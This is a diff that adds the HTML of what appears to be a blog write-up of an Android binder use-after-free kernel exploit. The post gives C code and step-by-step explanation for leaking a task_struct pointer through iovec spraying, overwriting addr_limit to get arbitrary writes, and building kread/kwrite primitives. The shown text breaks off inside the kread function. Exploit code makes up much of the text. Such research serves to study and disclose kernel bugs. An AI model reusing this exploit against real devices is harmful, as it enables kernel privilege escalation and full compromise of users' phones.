+    <span class="n">iovec</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="mh">0x41414141</span><span class="p">;</span>
+    <span class="n">iovec</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+    <span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now the interesting part comes in, we use <code class="language-plaintext highlighter-rouge">fork()</code> to create a child process, which will sleep for 2 seconds, in the meanwhile the parent process frees the <code class="language-plaintext highlighter-rouge">binder_thread</code> struct, and calls <code class="language-plaintext highlighter-rouge">writev()</code>, which will allocate 25 iovecs to make the kernel allocate them in kmalloc-512, since every <code class="language-plaintext highlighter-rouge">iovec</code> struct is 16 bytes, we’ll allocate 400 bytes and reallocate the <code class="language-plaintext highlighter-rouge">binder_thread</code> struct which is 408 bytes. We only initialize the [10] and [11] ones so that kernel won’t process the other ones, which aren’t useful to exploitation.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">child</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* used to avoid race conditions */</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+    <span class="p">[...]</span>
+<span class="p">}</span>
+
+<span class="cm">/* free binder_thread struct */</span>
+<span class="n">binder_thread_free</span><span class="p">();</span>
+
+<span class="cm">/* reallocates binder_thread with iovecs */</span>
+<span class="n">nBytesWritten</span> <span class="o">=</span> <span class="n">writev</span><span class="p">(</span><span class="n">WRITE_PIPE</span><span class="p">,</span> <span class="n">iovec</span><span class="p">,</span> <span class="n">IOVEC_SIZE</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now iovecs overlapped <code class="language-plaintext highlighter-rouge">binder_thread</code> struct, that’s how it looks like in memory:</p>
+
+<p><img src="https://github.com/cutesmilee/cutesmilee.github.io/raw/main/images/iovec_spray.png" alt="iovec_spray" style="zoom:50%;" /></p>
+
+<p>Now let’s try to see what values overlap the <code class="language-plaintext highlighter-rouge">binder_thread</code> fields, and why.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">dummy_page</span><span class="p">;</span>
+<span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+<span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="mh">0x41414141</span><span class="p">;</span>
+<span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We set the first <code class="language-plaintext highlighter-rouge">iov_base</code> to the <code class="language-plaintext highlighter-rouge">mmap()</code>ed page to avoid deadlocking (the address looks like an unlocked lock), we set the corrisponding <code class="language-plaintext highlighter-rouge">iov_len</code> field to PAGE_SIZE, which is also the size of the pipe, we did this so that it won’t process the next iovec immediately, but we’ll have to manually <code class="language-plaintext highlighter-rouge">read()</code> from the pipe again.</p>
+
+<p>We initialize the other iovec with an invalid address since it’ll be overwritten with a kernel address.</p>
+
+<p>Now the cool part comes in, the child triggers the unlink, so a pointer to <code class="language-plaintext highlighter-rouge">binder_thread-&gt;wait.head</code> is written to <code class="language-plaintext highlighter-rouge">iovec[10].iov_len</code> (which overlapped <code class="language-plaintext highlighter-rouge">binder_thread-&gt;wait.task_list.next</code>) and to <code class="language-plaintext highlighter-rouge">iovec[11].iov_base</code> (which overlapped <code class="language-plaintext highlighter-rouge">binder_thread-&gt;wait.task_list.prev</code>).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">child</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* used to avoid race conditions */</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+    <span class="n">unlink_kptr_write</span><span class="p">();</span>
+    <span class="p">[...]</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">unlink_kptr_write</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">epoll_ctl</span><span class="p">(</span><span class="n">epoll_fd</span><span class="p">,</span> <span class="n">EPOLL_CTL_DEL</span><span class="p">,</span> <span class="n">binder_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We triggered the unlink, and  <code class="language-plaintext highlighter-rouge">iovec[11].iov_base</code> and <code class="language-plaintext highlighter-rouge">iovec[10].iov_len</code> (I haven’t represented  <code class="language-plaintext highlighter-rouge">iovec[10].iov_len</code> since it’s not useful to exploitation) have been overwritten with the address of <code class="language-plaintext highlighter-rouge">binder_thread-&gt;wait.task_list.prev</code>, that’s how it looks like in memory:</p>
+
+<p><img src="https://github.com/cutesmilee/cutesmilee.github.io/raw/main/images/unlink_kptr_write.png" alt="unlink_kptr_write" style="zoom:50%;" /></p>
+
+<p>Now the child reads from the pipe, so it’ll process the first valid iovec, which points to the <code class="language-plaintext highlighter-rouge">mmap()</code>ed page, we don’t care about this read.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">child</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[...]</span>
+    <span class="cm">/* dummy read */</span>
+    <span class="n">nBytesRead</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">READ_PIPE</span><span class="p">,</span> <span class="n">pipe_read_buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pipe_read_buffer</span><span class="p">));</span>
+    <span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now the parent process reads from the pipe again, this time the next iovec will be processed, so it’ll read from <code class="language-plaintext highlighter-rouge">iovec[11]</code>, but now its <code class="language-plaintext highlighter-rouge">iov_base</code> contains a pointer to <code class="language-plaintext highlighter-rouge">binder_thread-&gt;wait.head</code>, so it’ll read data from there, now that we got the data back in userland we can find our <code class="language-plaintext highlighter-rouge">task_struct</code> pointer at offset 0xE8.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nBytesRead</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">READ_PIPE</span><span class="p">,</span> <span class="n">pipe_read_buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pipe_read_buffer</span><span class="p">));</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">nBytesRead</span> <span class="o">!=</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] parent failed to read dummy data: 0x%x instead of 0x%x"</span><span class="p">,</span> <span class="n">nBytesRead</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/* the task_struct kptr is at offset 0xE8 */</span>
+<span class="n">task_struct_kptr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">pipe_read_buffer</span> <span class="o">+</span> <span class="n">PIPE_READ_KPTR_OFFSET</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Note that all macros like <code class="language-plaintext highlighter-rouge">READ_PIPE</code> or <code class="language-plaintext highlighter-rouge">KREAD_PIPE</code> and <code class="language-plaintext highlighter-rouge">WRITE_PIPE</code> or <code class="language-plaintext highlighter-rouge">KWRITE_PIPE</code> are just wrappers for the corresponding pipe for reading or writing.</p>
+
+<p><strong>Arbitrary Write</strong></p>
+
+<p>Now it’s time to use the unlink primitive to get an arbitrary write, once we get it, we’ll be able to overwrite <code class="language-plaintext highlighter-rouge">addr_limit</code> in <code class="language-plaintext highlighter-rouge">task_struct</code> with 0xFFFFFFFFFFFFFFFE (since on ARM64 there’s a check against  <code class="language-plaintext highlighter-rouge">addr_limit</code> which doesn’t allow to set it to 0xFFFFFFFFFFFFFFFF), so that we can write to the whole memory space (since <code class="language-plaintext highlighter-rouge">addr_limit</code> indicates the maximum address that you can write to).</p>
+
+<p>This time we’ll use <code class="language-plaintext highlighter-rouge">socketpair()</code> since there’re some technical issues which doesn’t make us able to use pipes to spray iovec array, so we create the socketpair, and <code class="language-plaintext highlighter-rouge">write()</code> a random byte (it’s needed for initialization), like the previous stage we create a child process, which sleeps for 2 seconds, in the meanwhile we free <code class="language-plaintext highlighter-rouge">binder_thread</code> and spray our iovec array, this time using <code class="language-plaintext highlighter-rouge">recvmsg()</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* garbage data */</span>
+<span class="kt">char</span> <span class="n">garbage_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x41</span> <span class="p">};</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] setting up a socketpair</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span> <span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sock_fd</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] failed to create socketpair</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* needed to "init" recvmsg() */</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] writing garbage to the socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">nBytesWritten</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">WRITE_SOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">garbage_data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">garbage_data</span><span class="p">));</span>
+
+<span class="k">if</span><span class="p">(</span><span class="n">nBytesWritten</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">garbage_data</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] write() returned 0x%x instead of 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">nBytesWritten</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">garbage_data</span><span class="p">));</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">child</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* used to avoid race conditions */</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+    <span class="p">[...]</span>
+<span class="p">}</span>
+
+<span class="cm">/* free binder_thread struct which is gonna be reallocated by the child's write() */</span>
+<span class="n">binder_thread_free</span><span class="p">();</span>
+
+<span class="k">struct</span> <span class="n">msghdr</span> <span class="n">message</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+<span class="n">message</span><span class="p">.</span><span class="n">msg_iov</span> <span class="o">=</span> <span class="n">iovec</span><span class="p">;</span>
+<span class="n">message</span><span class="p">.</span><span class="n">msg_iovlen</span> <span class="o">=</span> <span class="n">IOVEC_SIZE</span><span class="p">;</span>
+
+<span class="cm">/* this reallocates the binder_thread struct with our iovecs */</span>
+<span class="kt">int</span> <span class="n">received_bytes_addr_limit</span> <span class="o">=</span> <span class="n">recvmsg</span><span class="p">(</span><span class="n">RECVMSG_SOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">message</span><span class="p">,</span> <span class="n">MSG_WAITALL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The memory layout will be the same as the one after the spray done by <code class="language-plaintext highlighter-rouge">task_struct_leak</code>:</p>
+
+<p><img src="https://github.com/cutesmilee/cutesmilee.github.io/raw/main/images/iovec_spray.png" alt="iovec_spray" style="zoom:50%;" /></p>
+
+<p>Now let’s try to see what values overlap the <code class="language-plaintext highlighter-rouge">binder_thread</code> fields, and why.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">dummy_page</span><span class="p">;</span>
+<span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="mh">0x41414141</span><span class="p">;</span>
+<span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">;</span>
+<span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="mh">0x42424242</span><span class="p">;</span>
+<span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>As we did before we write the <code class="language-plaintext highlighter-rouge">mmap()</code>ed page to the <code class="language-plaintext highlighter-rouge">iov_base</code> of the first (valid) iovec to avoid locking issues, the <code class="language-plaintext highlighter-rouge">iov_len</code> can be any value, we just place 1 to get a smaller return value from <code class="language-plaintext highlighter-rouge">recvmsg()</code> (it returns the sum of all <code class="language-plaintext highlighter-rouge">iov_len</code> of valid iovecs), the other two <code class="language-plaintext highlighter-rouge">iov_base</code> pointers are set to random addresses because they’ll be overwritten later, but the <code class="language-plaintext highlighter-rouge">iov_len</code> fields are so important, the second one has to be 0x8 + 0x8 + 0x8 + 0x8, we’ll see later why, the last one is set to 0x8 since it’s gonna be the size of the arbitrary write, since we’re gonna write a kernel pointer (which is 8 bytes long), 0x8 is the right size.</p>
+
+<p>Now that we sprayed our iovec array, the child triggers the unlink as we did in the previous stage, so that <code class="language-plaintext highlighter-rouge">iovec[11].iov_base</code> points to <code class="language-plaintext highlighter-rouge">iovec[10].iov_len</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">child</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* used to avoid race conditions */</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+    <span class="n">unlink_kptr_write</span><span class="p">();</span>
+    <span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The memory layout will be the same as the one after the unlink done by <code class="language-plaintext highlighter-rouge">task_struct_leak</code>:</p>
+
+<p><img src="https://github.com/cutesmilee/cutesmilee.github.io/raw/main/images/unlink_kptr_write.png" alt="unlink_kptr_write" style="zoom:50%;" /></p>
+
+<p>Now the child calls <code class="language-plaintext highlighter-rouge">write()</code> passing <code class="language-plaintext highlighter-rouge">final_sock_data</code> as data to send.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">child</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* used to avoid race conditions */</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+    <span class="n">unlink_kptr_write</span><span class="p">();</span>
+    <span class="n">nBytesWritten</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">WRITE_SOCK</span><span class="p">,</span> <span class="n">final_sock_data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">final_sock_data</span><span class="p">));</span>
+    <span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s look at what data are sent through <code class="language-plaintext highlighter-rouge">write()</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">final_sock_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+						<span class="mh">0x1</span><span class="p">,</span>                                        <span class="c1">// iovec[IOVEC_OVERLAP_INDEX].iov_len</span>
+            <span class="mh">0x41414141</span><span class="p">,</span>                                 <span class="c1">// iovec[IOVEC_OVERLAP_INDEX + 1].iov_base</span>
+            <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">,</span>                      <span class="c1">// iovec[IOVEC_OVERLAP_INDEX + 1].iov_len</span>
+            <span class="n">task_struct_kptr</span> <span class="o">+</span> <span class="n">ADDR_LIMIT_OFFSET</span><span class="p">,</span>       <span class="c1">// iovec[IOVEC_OVERLAP_INDEX + 2].iov_base</span>
+            <span class="mh">0x8</span><span class="p">,</span>                                        <span class="c1">// iovec[IOVEC_OVERLAP_INDEX + 2].iov_len</span>
+            <span class="mh">0xFFFFFFFFFFFFFFFE</span>                          <span class="c1">// addr_limit value to write</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Now that we called <code class="language-plaintext highlighter-rouge">write()</code> the kernel will start processing all the valid iovecs, the first one is <code class="language-plaintext highlighter-rouge">iovec[10]</code>, this will just write a byte to the <code class="language-plaintext highlighter-rouge">mmap()</code>ed page, it’s not important, we just do that because we have to process the next one after it has been corrupted by the unlink. Now we’ll process <code class="language-plaintext highlighter-rouge">iovec[11]</code>, but if you remember we corrupted its <code class="language-plaintext highlighter-rouge">iov_base</code> with a pointer to <code class="language-plaintext highlighter-rouge">iovec[10].iov_len</code>, so it’ll write 0x20 (since we set <code class="language-plaintext highlighter-rouge">iovec[11].iov_len</code> to 0x8 + 0x8 + 0x8 + 0x8) from <code class="language-plaintext highlighter-rouge">final_sock_data</code> to <code class="language-plaintext highlighter-rouge">iovec[10].iov_len</code>.</p>
+
+<p>As result we’re able to overwrite <code class="language-plaintext highlighter-rouge">iovec[12].iov_base</code> to an arbitrary address, in this case the address of <code class="language-plaintext highlighter-rouge">addr_limit</code>.</p>
+
+<p><img src="https://github.com/cutesmilee/cutesmilee.github.io/raw/main/images/iovec_processing_11.png" alt="iovec_processing_11" style="zoom:50%;" /></p>
+
+<p>Now that the kernel finished processing <code class="language-plaintext highlighter-rouge">iovec[11]</code>, it’ll start processing <code class="language-plaintext highlighter-rouge">iovec[12]</code>, but as I said we just overwrote its <code class="language-plaintext highlighter-rouge">iov_base</code> with the address of <code class="language-plaintext highlighter-rouge">addr_limit</code>, so it’s gonna write <code class="language-plaintext highlighter-rouge">iov_len</code> (0x8) bytes from the remaining data from <code class="language-plaintext highlighter-rouge">final_sock_data</code> to <code class="language-plaintext highlighter-rouge">addr_limit</code>, in this case 0xFFFFFFFFFFFFFFFE!</p>
+
+<p>We can easily check if all the writes have been done without issues just by checking the return value of <code class="language-plaintext highlighter-rouge">write()</code> and <code class="language-plaintext highlighter-rouge">recvmsg()</code>, if  <code class="language-plaintext highlighter-rouge">write()</code> returns the size of <code class="language-plaintext highlighter-rouge">final_sock_data</code>, and <code class="language-plaintext highlighter-rouge">recvmsg()</code> returns the sum of all the <code class="language-plaintext highlighter-rouge">iov_len</code> of the valid iovecs.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">child</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[...]</span>
+    <span class="n">nBytesWritten</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">WRITE_SOCK</span><span class="p">,</span> <span class="n">final_sock_data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">final_sock_data</span><span class="p">));</span>
+
+    <span class="cm">/* ensures that the write has been correctly done */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">nBytesWritten</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">final_sock_data</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] write() returned 0x%x instead of 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">nBytesWritten</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">final_sock_data</span><span class="p">));</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">[...]</span>
+<span class="kt">int</span> <span class="n">expected_bytes_addr_limit</span> <span class="o">=</span> <span class="n">iovec</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">+</span>
+                                <span class="n">iovec</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">+</span>
+                                <span class="n">iovec</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span> <span class="o">+</span> <span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="n">received_bytes_addr_limit</span> <span class="o">!=</span> <span class="n">expected_bytes_addr_limit</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] recvmsg() wasn't able to overwrite addr_limit: returned 0x%x instead of 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">received_bytes_addr_limit</span><span class="p">,</span> <span class="n">expected_bytes_addr_limit</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>Stable arbitrary kernel r/w</strong></p>
+
+<p>Now that we overwrote  <code class="language-plaintext highlighter-rouge">addr_limit</code>, getting arbitrary kernel r/w is as easy as using pipes :p</p>
+
+<p>We obviously create a new pair of pipes for reading and writing to arbitrary addresses, after that the journey is easy. For arbitrary write we just need to <code class="language-plaintext highlighter-rouge">write()</code> the data we wanna write to the pipe, and <code class="language-plaintext highlighter-rouge">read()</code> the data back to the kernel address we wanna write to.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">kwrite</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">kaddr</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">user_value</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* doing this to avoid possible issues */</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] writing more than a kernel page can cause issues</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="cm">/* writes user's value to pipe */</span>
+    <span class="k">if</span><span class="p">(</span> <span class="n">write</span><span class="p">(</span><span class="n">KWRITE_PIPE</span><span class="p">,</span> <span class="n">user_value</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] failed to write the value to the pipe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="cm">/* writes the user's value we wrote to the pipe to the kaddr */</span>
+    <span class="k">if</span><span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="n">KREAD_PIPE</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">kaddr</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] failed to write to kernel memory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>For the arbitrary read it’s exactly the opposite, we just need to <code class="language-plaintext highlighter-rouge">write()</code> the kernel address we wanna read from to the pipe, and <code class="language-plaintext highlighter-rouge">read()</code> back to the userland buffer.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">kread</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">kaddr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">user_value</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* doing this to avoid possible issues */</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] reading more than a kernel page can cause issues</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="cm">/* writes kernel data to pipe */</span>
+    <span class="k">if</span><span class="p">(</span> <span class="n">write</span><span class="p">(</span><span class="n">KWRITE_PIPE</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">kaddr</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">!=</span> <span class="n">size</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] failed to read kernel data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
